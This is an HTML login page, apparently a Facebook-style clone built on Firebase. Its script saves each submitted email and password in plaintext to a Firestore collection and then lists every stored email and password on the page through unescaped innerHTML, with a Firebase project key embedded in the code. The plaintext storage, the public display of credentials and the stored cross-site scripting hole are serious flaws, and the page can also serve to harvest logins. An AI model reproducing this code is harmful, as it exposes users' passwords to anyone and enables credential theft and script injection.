<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1 class="logo">AppName</h1>

    <form class="login-form" id="loginForm">
      <input type="text" id="email" placeholder="Email or phone number" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <h2>Saved Users:</h2>
    <div id="output"></div>

    <div class="divider">
      <span>or</span>
    </div>

    <button class="create">Create New Account</button>
  </div>

  <!-- Firebase SDK -->
  <script type="module">

    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    // ðŸ”¥ PASTE YOUR FIREBASE CONFIG HERE
    const firebaseConfig = {
      apiKey: "AIzaSyBW22kvaOIfcyvuEfFIt9K_jzoANdwRd04",
      authDomain: "fblog-19d96.firebaseapp.com",
      projectId: "fblog-19d96",
      storageBucket: "fblog-19d96.firebasestorage.app",
      messagingSenderId: "470115128763",
      appId: "1:470115128763:web:46fed5c219808b1cbd209e"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Add Data
    const form = document.getElementById("loginForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault(); // ðŸš« STOP PAGE RELOAD

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  try {
    await addDoc(collection(db, "users"), {
      email: email,
      password: password,
      createdAt: new Date()
    });

    alert("Data Saved!");
    form.reset();
    loadData();
  } catch (error) {
    console.error("Error saving data:", error);
  }
});


    // Load Data
    async function loadData() {
      const querySnapshot = await getDocs(collection(db, "users"));
      const output = document.getElementById("output");
      output.innerHTML = "";

      querySnapshot.forEach((doc) => {
        const data = doc.data();
        output.innerHTML += `
          <p><strong>${data.email}</strong> - ${data.password}</p>
        `;
      });
    }

    loadData();

  </script>
</body>
</html>
